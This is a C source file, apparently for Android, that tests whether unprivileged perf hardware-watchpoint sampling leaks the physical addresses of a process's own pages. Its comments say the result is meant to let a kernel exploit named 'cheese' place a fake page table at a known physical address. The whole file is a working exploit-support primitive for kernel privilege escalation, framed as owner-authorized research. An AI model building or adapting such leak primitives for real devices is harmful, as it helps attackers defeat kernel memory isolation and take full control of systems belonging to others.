// pa_leak.c — read-only physical-address leak probe for owner-authorized research.
// Purpose: test whether unprivileged perf hardware-watchpoint sampling yields
// PERF_SAMPLE_PHYS_ADDR for pages this process owns (perf_event_paranoid == -1).
// If it works, cheese's fake page table can be placed at a KNOWN physical address
// instead of brute-forcing spray addresses (which can hit wild mappings and panic).
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>

/* bionic does not ship linux/hw_breakpoint.h */
#ifndef HW_BREAKPOINT_W
#define HW_BREAKPOINT_R      1
#define HW_BREAKPOINT_W      2
#define HW_BREAKPOINT_RW     (HW_BREAKPOINT_R | HW_BREAKPOINT_W)
#define HW_BREAKPOINT_X      4
#define HW_BREAKPOINT_LEN_1  1
#define HW_BREAKPOINT_LEN_2  2
#define HW_BREAKPOINT_LEN_4  4
#define HW_BREAKPOINT_LEN_8  8
#endif

static long perf_open(struct perf_event_attr *a, pid_t pid, int cpu, int grp, unsigned long fl) {
    return syscall(__NR_perf_event_open, a, pid, cpu, grp, fl);
}

static void dump_samples(struct perf_event_mmap_page *meta, const char *label) {
    char *base = (char *)meta;
    uint64_t head = meta->data_head;
    __sync_synchronize();
    uint64_t tail = meta->data_tail;
    int printed = 0;
    while (tail < head && printed < 6) {
        struct perf_event_header *h = (struct perf_event_header *)(base + meta->data_offset + (tail % meta->data_size));
        if (h->size == 0) break;
        if (h->type == PERF_RECORD_SAMPLE) {
            unsigned char *p = (unsigned char *)h + sizeof(*h);
            uint64_t ip = 0, addr = 0, phys = 0; uint32_t pid = 0, tid = 0;
            memcpy(&ip, p, 8); p += 8;
            memcpy(&pid, p, 4); p += 4;
            memcpy(&tid, p, 4); p += 4;
            memcpy(&addr, p, 8); p += 8;
            memcpy(&phys, p, 8); p += 8;
            printf("  [%s] ip=%#llx addr=%#llx PHYS=%#llx (pid=%u tid=%u)\n",
                   label, (unsigned long long)ip, (unsigned long long)addr,
                   (unsigned long long)phys, pid, tid);
            printed++;
        }
        tail += h->size;
    }
    meta->data_tail = head;
}

int main(void) {
    const size_t PAGE = 4096, NP = 4;
    size_t len = PAGE * NP;
    char *buf = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (buf == MAP_FAILED) { perror("mmap buf"); return 1; }
    for (size_t off = 0; off < len; off += PAGE) buf[off] = 1;

    printf("user pages: %p .. %p\n", buf, buf + len);

    struct perf_event_attr a;
    memset(&a, 0, sizeof(a));
    a.type = PERF_TYPE_BREAKPOINT;
    a.size = sizeof(a);
    a.bp_type = HW_BREAKPOINT_W;
    a.bp_addr = (uint64_t)(uintptr_t)buf;      /* watch page 0 */
    a.bp_len = HW_BREAKPOINT_LEN_8;
    a.sample_period = 1;
    a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_ADDR | PERF_SAMPLE_PHYS_ADDR;
    a.disabled = 1;
    a.exclude_kernel = 1;
    a.exclude_hv = 1;

    errno = 0;
    int fd = (int)perf_open(&a, 0, -1, -1, 0);
    if (fd < 0) {
        printf("perf_event_open(W breakpoint) FAILED: %s (errno=%d)\n", strerror(errno), errno);
        /* fallback: plain software counter, to distinguish SELinux denial from bp support */
        memset(&a, 0, sizeof(a));
        a.type = PERF_TYPE_SOFTWARE; a.config = PERF_COUNT_SW_CPU_CLOCK;
        a.size = sizeof(a); a.disabled = 1; a.sample_period = 100000;
        errno = 0;
        int fd2 = (int)perf_open(&a, 0, -1, -1, 0);
        printf("fallback perf_event_open(sw cpu-clock) -> %d (%s)\n", fd2, fd2 < 0 ? strerror(errno) : "OK");
        if (fd2 >= 0) close(fd2);
        return 2;
    }

    size_t rbsz = PAGE * (1 + 4);
    struct perf_event_mmap_page *meta = mmap(NULL, rbsz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (meta == MAP_FAILED) { perror("mmap ring"); return 1; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    for (int i = 0; i < 500; i++) *(volatile char *)buf = (char)i;   /* trigger watchpoint */
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    dump_samples(meta, "watch-page0");

    /* second pass: watch a different page to prove per-page resolution */
    a.bp_addr = (uint64_t)(uintptr_t)(buf + 2 * PAGE);
    struct perf_event_attr b = a;
    b.disabled = 1;
    errno = 0;
    int fd3 = (int)perf_open(&b, 0, -1, -1, 0);
    if (fd3 >= 0) {
        struct perf_event_mmap_page *m3 = mmap(NULL, rbsz, PROT_READ | PROT_WRITE, MAP_SHARED, fd3, 0);
        if (m3 != MAP_FAILED) {
            ioctl(fd3, PERF_EVENT_IOC_RESET, 0);
            ioctl(fd3, PERF_EVENT_IOC_ENABLE, 0);
            for (int i = 0; i < 500; i++) *(volatile char *)(buf + 2 * PAGE) = (char)i;
            ioctl(fd3, PERF_EVENT_IOC_DISABLE, 0);
            dump_samples(m3, "watch-page2");
        }
        close(fd3);
    } else {
        printf("second breakpoint failed: %s\n", strerror(errno));
    }
    close(fd);
    return 0;
}
